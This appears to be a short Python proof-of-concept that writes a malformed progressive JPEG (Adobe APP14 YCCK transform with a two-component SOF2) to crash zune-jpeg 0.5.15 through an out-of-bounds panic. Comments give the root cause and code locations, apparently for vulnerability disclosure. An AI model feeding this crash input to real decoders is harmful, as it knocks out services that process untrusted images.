#!/usr/bin/env python3
# PoC generator: zune-jpeg 0.5.15 reachable panic (index out of bounds) at src/mcu_prog.rs:102.
# Root cause: the YCCK->YCbCr colorspace fixup in setup_component_params (src/misc.rs:300-303) sets
# input_colorspace = YCbCr (num_components()==3) WITHOUT clamping to components.len(), when an APP14
# transform=2 (YCCK, 4 comp) meets a progressive SOF2 declaring only 2 components. The sibling
# non-YCCK branch (misc.rs:325-334) correctly clamps via MultiBand(components.len()); this one does
# not. decode_mcu_ycbcr_progressive then loops `for i in 0..num_components()` (=0..3) and indexes
# `self.components[i]` (mcu_prog.rs:102) on a len-2 slice -> bounds-checked panic (aborts; production
# profile overflow-checks OFF too, so NOT build_profile_gated).
import struct, sys
def seg(marker, payload): return bytes([0xFF, marker]) + struct.pack(">H", len(payload)+2) + payload
out = bytearray([0xFF,0xD8])                                            # SOI
out += seg(0xEE, b"Adobe"+b"\x00\x64"+b"\x00\x00"+b"\x00\x00"+b"\x02")  # APP14 Adobe transform=2 (YCCK)
out += seg(0xDB, b"\x00"+bytes([1]*64))                                 # DQT table 0
out += seg(0xC4, b"\x00"+bytes([1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0])+b"\x00")  # DHT DC0
out += seg(0xC4, b"\x10"+bytes([1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0])+b"\x00")  # DHT AC0
out += seg(0xC2, b"\x08"+struct.pack(">H",16)+struct.pack(">H",16)+b"\x02"+b"\x01\x11\x00"+b"\x02\x11\x00")  # SOF2, 2 comps
out += seg(0xDA, b"\x02"+b"\x01\x00"+b"\x02\x00"+b"\x00\x00\x00")       # SOS, DC scan
out += b"\x00\x00" + bytes([0xFF,0xD9])                                 # entropy + EOI
p = sys.argv[1] if len(sys.argv)>1 else "poc.jpg"
open(p,"wb").write(out); print(f"wrote {p} ({len(out)} bytes)")
